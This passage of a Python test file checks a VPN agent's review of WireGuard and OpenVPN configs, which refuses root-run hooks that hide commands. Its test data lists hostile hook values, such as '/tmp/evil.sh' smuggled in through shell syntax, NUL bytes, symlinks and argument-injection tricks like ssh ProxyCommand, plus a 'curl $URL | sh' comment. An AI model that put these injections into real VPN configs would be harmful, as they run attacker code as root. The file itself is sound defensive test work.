    assert any(runs in hook for hook in r.root_hooks)
    assert _blocked(r, "WireGuard config:") and any("administrator" in b for b in r.blockers)


def test_a_hidden_hook_on_disconnect_is_a_risk_not_a_blocker(tmp_path):
    path = wg_conf(tmp_path, "wgh", interface_extra="PostDown # = /tmp/evil.sh\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgh"}))
    assert r.allowed and any("/tmp/evil.sh" in item for item in r.risks)


def test_a_comment_after_a_hook_value_is_not_a_hidden_hook(tmp_path):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = echo hi # note\n")))
    assert not any("WireGuard config:" in b for b in r.blockers)
    assert r.root_hooks == ("PostUp: echo hi # note",)        # wg-quick runs the unstripped value


def _only_writable(*folders):
    names = {str(f) for f in folders}

    def stat_(path, *a, **k):
        mode = (stat.S_IFDIR | 0o777) if str(path) in names else ROOT_DIR
        return types.SimpleNamespace(st_uid=0, st_mode=mode)
    return stat_


def test_every_link_of_a_three_link_chain_is_checked(tmp_path, monkeypatch):
    """safe/tool -> safe3/hop1 -> loose/hop2 -> safe2/tool: only the second link
    sits in a folder a user can write."""
    safe, safe3, loose, safe2 = (tmp_path / n for n in ("safe", "safe3", "loose", "safe2"))
    for d in (safe, safe3, loose, safe2):
        d.mkdir()
    (safe2 / "tool").write_text("#!/bin/sh\n")
    (loose / "hop2").symlink_to(safe2 / "tool")
    (safe3 / "hop1").symlink_to(loose / "hop2")
    (safe / "tool").symlink_to(safe3 / "hop1")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(loose))
    reason = vpn_execution._unsafe_executable_reason(safe / "tool")
    assert reason is not None and str(loose) in reason


def test_a_relative_link_is_resolved_from_its_own_folder(tmp_path, monkeypatch):
    safe, loose = tmp_path / "safe", tmp_path / "loose"
    safe.mkdir()
    loose.mkdir()
    (loose / "x").write_text("#!/bin/sh\n")
    (safe / "tool").symlink_to("../loose/x")
    monkeypatch.chdir("/")                       # a cwd-relative resolve would miss loose
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(loose))
    reason = vpn_execution._unsafe_executable_reason(safe / "tool")
    assert reason is not None and str(loose) in reason


def test_a_link_before_dotdot_is_followed_first(tmp_path, monkeypatch):
    """S/prog -> "x/../y", S/x -> W/hop, W/hop -> R2/d: the kernel goes through
    W/hop (in a writable folder) and lands on R2/y; a text-only normpath skips it."""
    S, W, R2 = tmp_path / "S", tmp_path / "W", tmp_path / "R2"
    for d in (S, W, R2, R2 / "d"):
        d.mkdir()
    (R2 / "y").write_text("#!/bin/sh\n")
    (W / "hop").symlink_to(R2 / "d")
    (S / "x").symlink_to(W / "hop")
    (S / "prog").symlink_to("x/../y")
    assert os.path.realpath(S / "prog") == os.path.realpath(R2 / "y")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(W))
    reason = vpn_execution._unsafe_executable_reason(S / "prog")
    assert reason is not None and str(W) in reason


def test_a_link_loop_ends_and_is_refused(tmp_path):
    (tmp_path / "a").symlink_to(tmp_path / "b")
    (tmp_path / "b").symlink_to(tmp_path / "a")
    with pytest.raises(OSError):
        vpn_execution._paths_touched(tmp_path / "a")
    assert "too many links" in vpn_execution._unsafe_executable_reason(tmp_path / "a")


def test_forty_links_resolve_and_forty_one_are_refused(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable())
    (tmp_path / "tool").write_text("#!/bin/sh\n")
    previous = tmp_path / "tool"
    for n in range(41):
        link = tmp_path / f"l{n}"
        link.symlink_to(previous)
        previous = link
    touched = vpn_execution._paths_touched(tmp_path / "l39")    # 40 links
    assert tmp_path / "l0" in touched and tmp_path / "tool" in touched
    assert vpn_execution._unsafe_executable_reason(tmp_path / "l39") is None
    assert "too many links" in vpn_execution._unsafe_executable_reason(tmp_path / "l40")


def test_a_folder_a_link_target_passes_through_before_dotdot_is_checked(tmp_path, monkeypatch):
    """S/prog -> W/sub/../../R2/y: the kernel walks into W (writable) before the
    two ".." bring it back; a user could swap W/sub for a link meanwhile."""
    S, W, R2 = tmp_path / "S", tmp_path / "W", tmp_path / "R2"
    for d in (S, W, W / "sub", R2):
        d.mkdir()
    (R2 / "y").write_text("#!/bin/sh\n")
    (S / "prog").symlink_to(str(W / "sub") + "/../../R2/y")
    assert os.path.realpath(S / "prog") == os.path.realpath(R2 / "y")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(W))
    reason = vpn_execution._unsafe_executable_reason(S / "prog")
    assert reason is not None and str(W) in reason


def test_a_link_that_cannot_be_read_is_refused(tmp_path, monkeypatch):
    (tmp_path / "tool").write_text("#!/bin/sh\n")
    (tmp_path / "link").symlink_to(tmp_path / "tool")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable())

    def no_read(*a, **k):
        raise PermissionError(13, "Permission denied")
    monkeypatch.setattr(vpn_execution.os, "readlink", no_read)
    reason = vpn_execution._unsafe_executable_reason(tmp_path / "link")
    assert reason is not None and "could not be resolved" in reason


def test_a_nul_byte_in_a_hook_path_is_refused_not_raised(tmp_path):
    assert "not a usable path" in vpn_execution._unsafe_executable_reason(Path("/bin/ech\x00o"))
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = /bin/ech\x00o hi\n")))
    assert not r.allowed


def test_a_relative_path_is_not_normalised_before_its_links(tmp_path, monkeypatch):
    """"S/x/../y" from tmp_path: the kernel follows S/x (-> W/hop -> R2/d) before
    the "..", landing on R2/y; normalising first would look at S/y instead."""
    S, W, R2 = tmp_path / "S", tmp_path / "W", tmp_path / "R2"
    for d in (S, W, R2, R2 / "d"):
        d.mkdir()
    (R2 / "y").write_text("#!/bin/sh\n")
    (W / "hop").symlink_to(R2 / "d")
    (S / "x").symlink_to(W / "hop")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(W))
    reason = vpn_execution._unsafe_executable_reason(Path("S/x/../y"))
    assert reason is not None and str(W) in reason


def test_a_hook_with_a_huge_path_is_reviewed_quickly(tmp_path):
    """Codex on #32: a 256 KiB config can hold a path of ~100,000 components. An
    overlong hook is refused without walking it, and the longest hook that is
    walked (under 4000 characters) stays fast."""
    import time
    huge = "/" + "/".join(["a"] * 100_000)
    longest = "/" + "/".join(["a"] * 1_990)                   # just under the limit
    start = time.monotonic()
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {huge}\n")))
    assert not r.allowed and any("4000" in b for b in r.blockers)
    review("connect", profile_for(wg_conf(tmp_path, "wg2", interface_extra=f"PostUp = {longest}\n")))
    assert time.monotonic() - start < 5


# ── review of #32: NUL bytes, %i/%I, a link reached after ".." ──

@pytest.mark.parametrize("line, runs", [
    ("Post\x00Up = /tmp/evil.sh", "/tmp/evil.sh"),            # bash drops the NUL
    ("PostUp = \x00/tmp/evil.sh", "/tmp/evil.sh"),            # program word hidden by a NUL
])
@pytest.mark.parametrize("action", ["connect", "disconnect"])
def test_a_nul_byte_cannot_hide_a_hook(tmp_path, line, runs, action):
    path = wg_conf(tmp_path, "wgn", interface_extra=line + "\n")
    r = review(action, profile_for(path), Probe(up={"wgn"}) if action == "disconnect" else None)
    assert any(runs in hook for hook in r.root_hooks)
    found = r.blockers if action == "connect" else r.risks
    assert any("NUL byte" in item for item in found)
    if action == "connect":
        assert not r.allowed


def test_a_nul_byte_cannot_hide_saveconfig(tmp_path):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="Save\x00Config = true\n")))
    assert _blocked(r, "SaveConfig = true")


def test_a_nul_byte_in_an_openvpn_profile_is_refused(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "dev tun\nu\x00p /tmp/evil.sh\n")))
    assert _blocked(r, "NUL byte")


@pytest.mark.parametrize("word", ["/opt/vpn/%i/up.sh", "/etc/wireguard/%I.up"])
def test_a_hook_path_with_a_wg_quick_placeholder_is_refused(tmp_path, word):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {word}\n")))
    assert not r.allowed and any("%i and %I" in b and word in b for b in r.blockers)


def test_a_placeholder_outside_a_path_is_fine(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/local/sbin/hook.sh": (0, ROOT_FILE), "/usr/local/sbin": (0, ROOT_DIR),
        "/usr/local": (0, ROOT_DIR), "/usr": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = /usr/local/sbin/hook.sh %i\n")))
    assert not any("%i and %I" in b for b in r.blockers)


def test_a_link_reached_only_after_dotdot_is_checked(tmp_path, monkeypatch):
    """S/p -> "../T/l", T/l -> R/x: T is writable, and the walk reaches it only by
    applying the ".."; ignoring ".." would look for S/T/l and never see T."""
    S, T, R = tmp_path / "S", tmp_path / "T", tmp_path / "R"
    for d in (S, T, R):
        d.mkdir()
    (R / "x").write_text("#!/bin/sh\n")
    (T / "l").symlink_to(R / "x")
    (S / "p").symlink_to("../T/l")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(T))
    reason = vpn_execution._unsafe_executable_reason(S / "p")
    assert reason is not None and str(T) in reason


# ── second review of #32: plain commands with full paths (owner, 2026-11-06) ──
# wg-quick runs each hook through bash's eval as root. A hook bash would read
# differently from the review's literal words is refused outright.

PLAIN_RULE = "Tunnel cannot check what this hook runs; write plain commands with full paths."


@pytest.mark.parametrize("hook", [
    "echo $(/tmp/evil.sh)", "${CONFIG_FILE%/*}/up.sh", "sh</tmp/evil.sh", "/tm\"p\"/evil.sh",
    "/t\\mp/evil.sh", "/{tmp,x}/evil.sh", "/tm?/evil.sh", "/tm*/evil.sh", "/tm[p]/evil.sh",
    "`/tmp/evil.sh`", "'/tmp/evil.sh'", "~/evil.sh", "/usr/bin/true && (/tmp/evil.sh)",
    "/usr/bin/true | /bin/sh", "/bin/cat /etc/hosts > /tmp/x", "/usr/bin/true |& /bin/sh",
    ". /tmp/evil.sh", "source /tmp/evil.sh", "eval /tmp/evil.sh", "exec /tmp/evil.sh",
    "builtin source /tmp/evil.sh", "command /tmp/evil.sh", "! /tmp/evil.sh",
    "{ /tmp/evil.sh; }", "if /usr/bin/true; then :; fi", "time /tmp/evil.sh",
    "cmd /tmp/evil.sh", "echo hi", "PATH=/tmp ls", "PATH=/tmp; ls", "./evil.sh",
    "bin/evil.sh", "hook-%I", "up:zz", "nosuchcmd-zz9", "/usr/bin/true\v/tmp/x",
    "/bin/sh -c id", "/usr/bin/python3 -m evil", "/usr/bin/perl -e1", "/usr/bin/env -Sls",
    "/bin/sh %I", "/usr/bin/env /bin/sh -c foo", "/usr/bin/find /etc -exec rm",
])
def test_a_hook_with_shell_syntax_or_an_unchecked_command_is_refused(tmp_path, hook):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert not r.allowed
    assert any(PLAIN_RULE in b and "The PostUp hook" in b for b in r.blockers), r.blockers


@pytest.mark.parametrize("hook", ["echo $(/tmp/evil.sh)", ". /tmp/evil.sh", "nosuchcmd-zz9"])
def test_the_same_hooks_on_disconnect_are_risks_not_blockers(tmp_path, hook):
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {hook}\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgd"}))
    assert r.allowed and any(PLAIN_RULE in item for item in r.risks)


def test_the_refusal_names_what_bash_would_read_differently(tmp_path):
    def blockers(hook):
        r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
        return " ".join(r.blockers)
    assert "the shell character '$'" in blockers("echo $(/tmp/evil.sh)")
    assert "uses 'source', which bash runs itself" in blockers("source /tmp/evil.sh")
    assert "sets PATH for its command" in blockers("PATH=/tmp ls")
    assert "not a full path" in blockers("./evil.sh")
    assert "'hook-%I', which is not a plain program name" in blockers("hook-%I")
    assert "hands 'id' to /bin/sh" in blockers("/bin/sh -c id")
    assert "control character" in blockers("/usr/bin/true\x01")


@pytest.mark.parametrize("char", list("$`\\'\"*?[]{}<>()!~|"))      # written out: not read from the module
def test_every_shell_character_is_refused_on_its_own(tmp_path, char):
    r = review("connect", profile_for(wg_conf(
        tmp_path, interface_extra=f"PostUp = /usr/bin/true a{char}b\n")))
    assert _blocked(r, f"uses the shell character '{char}'")


@pytest.mark.parametrize("word", [".", "source", "eval", "exec", "builtin", "command", "if",
                                  "time", "cmd", "execute_hooks", "echo", "true", "test",
                                  "kill", "hash", "enable", "trap", "export", "cd"])
def test_a_shell_word_is_refused_even_when_a_program_of_that_name_exists(
        tmp_path, monkeypatch, word):
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/" + name)
    monkeypatch.setattr(vpn_execution, "_unsafe_executable_reason", lambda path: None)
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {word} /x\n")))
    assert _blocked(r, f"uses '{word}', which bash runs itself")


def test_separated_plain_commands_are_allowed_and_each_one_is_checked(tmp_path):
    plain = "/usr/bin/true; /usr/bin/true && /usr/bin/true || /usr/bin/true & /usr/bin/true"
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {plain}\n")))
    assert r.allowed, r.blockers
    script = _user_script(tmp_path)
    r = review("connect", profile_for(wg_conf(
        tmp_path, "wg2", interface_extra=f"PostUp = /usr/bin/true || {script} up\n")))
    assert _blocked(r, f"runs {script} as administrator")
    assert not any(PLAIN_RULE in b for b in r.blockers)       # judged as a path, not as syntax


def test_a_comment_after_a_blank_ends_the_hook_as_bash_reads_it(tmp_path):
    hook = "/usr/bin/true # was: curl $URL | sh"
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert r.allowed and r.root_hooks == (f"PostUp: {hook}",)


def test_a_script_given_to_a_shell_by_full_path_is_allowed(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/etc/wireguard/up.sh": (0, ROOT_FILE), "/etc/wireguard": (0, ROOT_DIR),
        "/etc": (0, ROOT_DIR), "/bin/sh": (0, ROOT_FILE), "/bin": (0, ROOT_DIR),
        "/": (0, ROOT_DIR)}))
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))   # no links anywhere
    hook = "/bin/sh -e /etc/wireguard/up.sh"
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert r.allowed, r.blockers


def test_a_placeholder_path_handed_to_an_interpreter_is_refused(tmp_path):
    """P3-4: the %i/%I check also applies past the first word."""
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = sh /etc/wireguard/%I.up\n")))
    assert _blocked(r, "%i and %I") and any("/etc/wireguard/%I.up" in b for b in r.blockers)


def test_a_bare_hook_key_shows_the_line_itself_as_its_command(tmp_path):
    """P3-4: wg-quick runs the bare "PreUp" line as a command; it is not empty."""
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PreUp\n")))
    assert r.root_hooks == ("PreUp: PreUp",)


def test_a_normal_config_with_plain_full_path_hooks_is_still_allowed(tmp_path, monkeypatch):
    """False-positive check: Interface, Peer, DNS and plain system-program hooks."""
    # The allowlist pins a Mac's layout. A merged-usr Linux runner links
    # /sbin to /usr/sbin, so with net-tools installed /sbin/route would resolve
    # elsewhere; keep paths as written so the test does not depend on the host.
    monkeypatch.setattr(vpn_execution, "_realpath", lambda p: p)
    extra = ("DNS = 10.64.0.1, 10.64.0.2 # resolver\n"
             "PostUp = /usr/sbin/networksetup -setdnsservers Wi-Fi 10.64.0.1\n"
             "PostDown = /sbin/route -n delete -inet 10.0.0.0/8 -interface %i\n")
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=extra)))
    assert r.allowed and r.blockers == ()
    assert not any("could replace" in w or "hands" in w or PLAIN_RULE in w
                   for w in r.warnings), r.warnings
    assert "DNS: 10.64.0.1, 10.64.0.2" in r.config_lines


# ── P1-2 / P3-3: bare names are looked up where wg-quick looks first ────────

def test_bare_names_are_found_only_in_the_system_folders_in_wg_quicks_order(tmp_path, monkeypatch):
    assert vpn_execution._PRIVILEGED_PATH == ("/usr/bin", "/bin", "/usr/sbin", "/sbin")
    own = tmp_path / "helper"
    own.write_text("#!/bin/sh\n")
    own.chmod(0o755)
    monkeypatch.setattr(vpn_execution.shutil, "which",
                        lambda name, *a, **k: str(tmp_path / "wg-quick"))
    assert vpn_execution._which_privileged("helper") is None   # wg-quick's own folder: not trusted
    assert vpn_execution._which_privileged("ls") in ("/usr/bin/ls", "/bin/ls")


def test_the_review_does_not_look_up_wg_quick_per_command(tmp_path, monkeypatch):
    calls = []
    monkeypatch.setattr(vpn_execution.shutil, "which",
                        lambda name, *a, **k: calls.append(name))
    vpn_execution._hook_findings("PostUp = " + "/usr/bin/true; " * 50 + "\n", "WireGuard")
    assert calls == []


# ── P3-2: the hook check has a ceiling, and stays fast up to it ─────────────

def test_a_config_full_of_tiny_commands_is_refused_quickly(tmp_path):
    line = "PostUp = " + "id;" * 1300 + "\n"
    path = wg_conf(tmp_path, interface_extra=line * 65)
    assert path.stat().st_size <= vpn_execution.CONFIG_READ_LIMIT
    start = time.monotonic()
    r = review("connect", profile_for(path))
    assert time.monotonic() - start < 1.0
    assert _blocked(r, f"more than {vpn_execution.HOOK_CHECK_LIMIT} commands and paths")


def test_a_hook_of_thousands_of_bad_commands_is_one_finding(tmp_path):
    """Second review, P3-3: 1990 refusals in one hook made a ~94,000-character dialog."""
    line = "PostUp = " + "a;" * 1990 + "\n"
    start = time.monotonic()
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=line * 65)))
    assert time.monotonic() - start < 1.0
    assert len([b for b in r.blockers if "The PostUp hook" in b]) == 65
    script = _user_script(tmp_path)
    r = review("connect", profile_for(wg_conf(
        tmp_path, "wg2", interface_extra=f"PostUp = {script}; {script}; {script}\n")))
    assert len([b for b in r.blockers if str(script) in b]) == 1


def test_a_config_full_of_paths_is_refused_quickly(tmp_path):
    line = "PostUp = /usr/bin/true " + "/a " * 1300 + "\n"
    path = wg_conf(tmp_path, interface_extra=line * 60)
    start = time.monotonic()
    r = review("connect", profile_for(path))
    assert time.monotonic() - start < 1.0
    assert _blocked(r, "commands and paths")


def test_the_ceiling_is_exact(tmp_path):
    each = "PostUp = /usr/bin/true\n"                 # one command and one path: two checks
    bare = "PostUp = id\n"                            # one command, no path: one check
    half = vpn_execution.HOOK_CHECK_LIMIT // 2
    at = review("connect", profile_for(wg_conf(
        tmp_path, "wga", interface_extra=each * (half - 1) + bare * 2)))
    over = review("connect", profile_for(wg_conf(
        tmp_path, "wgb", interface_extra=each * half + bare)))
    assert at.allowed, at.blockers
    assert _blocked(over, "commands and paths")


# ── P3-1: a path that cannot be looked at is unsafe, not skipped ────────────

def test_a_folder_stat_refuses_with_eacces_is_unsafe(monkeypatch):
    import errno as _errno

    def stat_(path, *a, **k):
        if str(path) == "/opt/locked":
            raise PermissionError(_errno.EACCES, "Permission denied", str(path))
        if str(path).startswith("/opt/locked/"):
            raise FileNotFoundError(_errno.ENOENT, "No such file", str(path))
        return types.SimpleNamespace(st_uid=0, st_mode=ROOT_DIR)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
    reason = vpn_execution._unsafe_executable_reason(Path("/opt/locked/hook.sh"))
    assert reason is not None and "/opt/locked could not be checked" in reason


def test_a_missing_file_is_still_judged_by_its_folders(monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({"/opt": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
    assert vpn_execution._unsafe_executable_reason(Path("/opt/x/hook.sh")) is None


def test_a_link_walk_that_cannot_look_at_a_folder_is_unsafe(monkeypatch):
    import errno as _errno

    def lstat_(path, *a, **k):
        if str(path) == "/opt/locked":
            raise PermissionError(_errno.EACCES, "Permission denied", str(path))
        raise FileNotFoundError(_errno.ENOENT, "No such file", str(path))
    monkeypatch.setattr(vpn_execution, "_stat", lambda p, *a, **k: types.SimpleNamespace(
        st_uid=0, st_mode=ROOT_DIR))
    monkeypatch.setattr(vpn_execution, "_lstat", lstat_)
    reason = vpn_execution._unsafe_executable_reason(Path("/opt/locked/hook.sh"))
    assert reason is not None and "could not be resolved" in reason


# ── P2-1: the DNS the review shows is the DNS wg-quick sets ─────────────────

def _inspect(body):
    from agents.vpn_agent.services.config_inspection import inspect_wireguard_text
    return inspect_wireguard_text("[Interface]\nAddress = 10.8.0.2/32\n" + body
                                  + "[Peer]\nAllowedIPs = 0.0.0.0/0\n", Path("x.conf"))


def test_a_dns_key_cut_off_by_a_comment_sets_no_dns():
    s = _inspect("DNS # = 10.64.0.1\n")
    assert s.dns_servers == ()
    assert any("'=' comes after a '#'" in w for w in s.warnings)


def test_a_comment_after_a_dns_value_is_not_part_of_it():
    assert _inspect("DNS = 10.64.0.1 # resolver\n").dns_servers == ("10.64.0.1",)


def test_a_unicode_line_separator_does_not_create_a_dns_entry():
    assert _inspect("MTU = 1420 DNS = 10.64.0.1\n").dns_servers == ()


def test_a_section_header_with_a_comment_still_counts_its_peer():
    from agents.vpn_agent.services.config_inspection import inspect_wireguard_text
    s = inspect_wireguard_text("[Interface]\nAddress = 10.8.0.2/32\n[Peer] # home\n"
                               "AllowedIPs = 0.0.0.0/0\n", Path("x.conf"))
    assert s.peer_count == 1 and s.allowed_ips == ("0.0.0.0/0",)


def test_the_review_says_system_dns_stays_when_dns_is_cut_off(tmp_path):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="DNS # = 10.64.0.1\n")))
    assert "DNS: Not specified — system DNS stays in use" in r.config_lines


# ── independent review of #33: the allowlist (owner, 2026-11-06) ────────────

@pytest.mark.parametrize("hook", [
    # P0-1: interpreters named in another case or with a version (APFS ignores case)
    "SH -c evilprog", "/bin/SH -c evilprog", "/usr/bin/ENV evilprog",
    "/usr/bin/perl5.34 -eexec+evilprog", "/bin/Bash -c evilprog", "/usr/bin/tclsh8.5 x",
    # P1-1: root-owned programs that run a program named in their arguments
    "/usr/sbin/taskpolicy -b evilprog", "/usr/bin/xcrun evilprog",
    "/usr/bin/ssh -oProxyCommand=evilprog x", "/usr/bin/ssh-agent evilprog",
    "/usr/bin/screen -dm evilprog", "/usr/sbin/dtrace -c evilprog -n BEGIN",
    "/usr/bin/rsync -e evilprog a b:c", "/usr/bin/lldb -o run evilprog",
    "/usr/bin/tar --use-compress-program=evilprog -cf /dev/null /etc/hosts",
    "/usr/bin/zip -T -TT=evilprog x", "/usr/bin/sandbox-exec -n no-network evilprog",
    "/usr/sbin/installer -pkg /tmp/x.pkg -target /", "/usr/bin/lockf /usr/bin/x evilprog",
    "/usr/bin/sqlite3 -init x.sql", "/usr/bin/make -f Makefile",
    # %i / %I handed to a system program that could run a program of that name
    "/usr/sbin/dtrace -c %I -n BEGIN", "/usr/bin/xcrun %i", "/bin/sh %I",
])
def test_a_program_off_the_allowlist_may_not_be_given_bare_words(tmp_path, hook):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert not r.allowed and any(PLAIN_RULE in b for b in r.blockers), r.blockers


@pytest.mark.parametrize("hook", [
    "/bin/SH -c /tmp/evil.sh", "/bin/Bash /tmp/evil.sh", "/usr/bin/perl5.34 /tmp/evil.pl",
    "/usr/bin/make -f /tmp/Makefile", "/usr/bin/sqlite3 /tmp/x.db",
])
def test_every_path_given_to_a_program_off_the_allowlist_is_checked_as_code(tmp_path, hook):
    """/tmp is world-writable: as code, each of these is refused, not merely warned."""
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert _blocked(r, "as administrator") and any("/tmp" in b for b in r.blockers)


@pytest.mark.parametrize("hook", [
    "/sbin/route -n add -net 10.0.0.0/8 -interface %i", "route -q -n delete 10.0.0.0/8",
    "/sbin/ifconfig %i inet 10.8.0.2 10.8.0.2 alias", "/usr/sbin/networksetup -setdnsservers Wi-Fi 10.64.0.1",
    "/usr/bin/killall -HUP mDNSResponder", "/usr/bin/dscacheutil -flushcache",
    "/usr/sbin/sysctl -w net.inet.ip.forwarding=1", "/usr/sbin/ipconfig set en0 DHCP",
    "/usr/bin/logger -t wireguard %I up", "/usr/sbin/scutil --nc list",
    "/sbin/pfctl -E", "/usr/sbin/networksetup -setv6off Wi-Fi && /usr/bin/dscacheutil -flushcache",
])
def test_the_allowlisted_network_programs_take_plain_arguments(tmp_path, monkeypatch, hook):
    # The real filesystem decides on a Mac; elsewhere these programs may not exist.
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/sbin/" + name)
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable())
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert r.allowed, r.blockers


def test_wg_is_on_the_allowlist_wherever_root_installed_it(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable())
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
    hook = "/usr/local/sbin/wg set %i peer abc allowed-ips 10.0.0.0/8"
    assert review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n"))).allowed


def test_the_allowlist_is_judged_by_where_a_link_leads(tmp_path):
    (tmp_path / "xcrun").write_text("#!/bin/sh\n")
    (tmp_path / "route").symlink_to(tmp_path / "xcrun")
    assert not vpn_execution._data_only(str(tmp_path / "route"))
    (tmp_path / "wg").symlink_to(tmp_path / "xcrun")        # wg is trusted by name alone
    assert not vpn_execution._data_only(str(tmp_path / "wg"))
    assert vpn_execution._data_only("/SBIN/Route")          # APFS: the same file as /sbin/route
    assert vpn_execution._data_only("/sbin/route")


def test_the_allowlist_pin_holds_on_both_sides_of_a_link(monkeypatch):
    """Independent review of #34, P3-3: the tool must be at its own path as
    written AND where a link leads."""
    monkeypatch.setattr(vpn_execution, "_realpath",
                        lambda p: {"/sbin/route": "/opt/x/route",
                                   "/usr/local/bin/route": "/sbin/route"}.get(p, p))
    assert not vpn_execution._data_only("/sbin/route")           # leads elsewhere
    assert not vpn_execution._data_only("/usr/local/bin/route")  # written elsewhere


@pytest.mark.parametrize("hook", [
    # PR #34 review (Sourcery): numbers and %i/%I can name a file or program
    "/bin/sh 1", "/bin/sh -c 1", "/opt/local/bin/python3 %I", "/etc/wireguard/up.sh %i",
    "/usr/sbin/dtrace -o /etc/hosts -c %I", "/USR/SBIN/dtrace -c %I", "/USR/BIN/env %I",
    "/usr/bin/env /etc/wireguard/up.sh %I", "/usr/bin/nice -n 5 /etc/wireguard/up.sh",
    "/usr/bin/tar --use-compress-program=evilprog",                 # a long option with a value
])
def test_numbers_and_placeholders_go_only_to_allowlisted_programs(tmp_path, monkeypatch, hook):
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable())
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert not r.allowed and any(PLAIN_RULE in b for b in r.blockers), r.blockers


def test_a_program_that_only_shares_an_allowlisted_name_is_not_trusted(tmp_path, monkeypatch):
    """PR #34 review (Sourcery): a root-owned wrapper called route could pass its
    arguments to a shell; only the macOS tool at its own path is allowlisted."""
    assert not vpn_execution._data_only("/usr/local/bin/route")
    assert not vpn_execution._data_only("/usr/bin/route")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable())
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
    r = review("connect", profile_for(wg_conf(
        tmp_path, interface_extra="PostUp = /usr/local/bin/route evilprog\n")))
    assert _blocked(r, "hands 'evilprog'")


def test_openvpn_recognises_interpreters_in_any_case_and_version():
    for name in ("/bin/SH", "ENV", "perl5.34", "/usr/bin/tclsh8.5", "python3.12", "/usr/bin/xcrun"):
        assert vpn_execution._runs_code(name), name
    assert not vpn_execution._runs_code("/sbin/route")


def test_an_openvpn_script_handed_to_an_uppercase_shell_is_checked_as_code(tmp_path):
    script = _user_script(tmp_path)
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup /bin/SH {script}\n")))
    assert _blocked(r, str(script))


# ── independent review of #33: surviving mutants (P2-3) and P3-1 ───────────

def test_a_hash_inside_a_word_is_not_a_comment(tmp_path):
    script = _user_script(tmp_path)
    r = review("connect", profile_for(wg_conf(
        tmp_path, interface_extra=f"PostUp = /sbin/route a#b; {script}\n")))
    assert _blocked(r, f"runs {script} as administrator")


def test_a_command_after_a_single_ampersand_is_checked(tmp_path):
    script = _user_script(tmp_path)
    r = review("connect", profile_for(wg_conf(
        tmp_path, interface_extra=f"PostUp = /sbin/route -n get 1.1.1.1 & {script}\n")))
    assert _blocked(r, f"runs {script} as administrator")


def test_a_comment_right_after_a_separator_ends_the_hook(tmp_path):
    r = review("connect", profile_for(wg_conf(
        tmp_path, interface_extra="PostUp = /usr/bin/true;# was: curl $URL | sh\n")))
    assert r.allowed, r.blockers


def test_a_non_ascii_space_in_allowed_ips_is_not_trimmed():
    from agents.vpn_agent.services.config_inspection import inspect_wireguard_text
    s = inspect_wireguard_text("[Interface]\nAddress = 10.8.0.2/32\n[Peer]\n"
                               "AllowedIPs = 0.0.0.0/0 \n", Path("x.conf"))
    assert any("AllowedIPs entry is not valid" in w for w in s.warnings)


# ── independent review of #33: DNS servers and search domains (P2-2) ───────

def test_a_name_in_dns_is_a_search_domain_not_a_server():
    s = _inspect("DNS = corp.example\n")
    assert s.dns_servers == () and s.dns_search == ("corp.example",)


